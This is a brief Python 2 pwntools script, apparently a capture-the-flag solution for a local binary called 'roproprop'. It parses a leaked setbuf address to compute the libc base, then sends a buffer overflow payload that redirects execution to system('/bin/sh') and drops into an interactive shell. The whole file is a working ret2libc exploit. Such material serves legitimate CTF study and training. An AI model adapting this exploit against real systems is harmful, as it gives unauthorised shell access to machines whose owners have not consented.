#!/usr/bin/env python2

from pwn import *

p = process('./roproprop')
libc = ELF('/usr/lib/libc-2.30.so')
setbuf_offset = libc.symbols['setbuf']

p.recvuntil('- ', drop=True)
setbuf_addr = int(p.recvuntil(' -', drop=True), 16)

libc.address = setbuf_addr - setbuf_offset

system_arg = libc.search('/bin/sh').next()
system_addr = libc.symbols['system']

p.recvuntil('Christmas?', drop=True)
p.recvline()

payload = fit({
    0x4ca+4: system_addr,
    0x4ca+12: system_arg

})

p.sendline(payload)

p.interactive()
